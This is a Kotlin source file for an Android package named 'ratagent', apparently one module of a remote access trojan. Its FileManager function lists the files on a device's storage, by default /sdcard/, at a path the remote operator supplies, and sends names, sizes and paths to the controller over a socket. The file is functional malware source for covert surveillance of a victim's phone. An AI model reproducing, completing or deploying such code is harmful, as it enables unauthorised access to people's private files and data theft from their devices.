package com.pentest.ratagent

import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import io.socket.client.Socket

object FileManager {
    
    fun listFiles(command: String) {
        val path = if (command.contains(" ")) command.split(" ")[1] else "/sdcard/"
        val dir = File(path)
        val files = JSONArray()
        
        if (dir.exists() && dir.isDirectory && dir.canRead()) {
            dir.listFiles()?.forEach { file ->
                val fileInfo = JSONObject().apply {
                    put("name", file.name)
                    put("size", file.length())
                    put("path", file.absolutePath)
                    put("isDirectory", file.isDirectory)
                }
                files.put(fileInfo)
            }
        }
        
        SocketManager.socket?.emit("file-list", JSONObject().put("files", files))
    }
}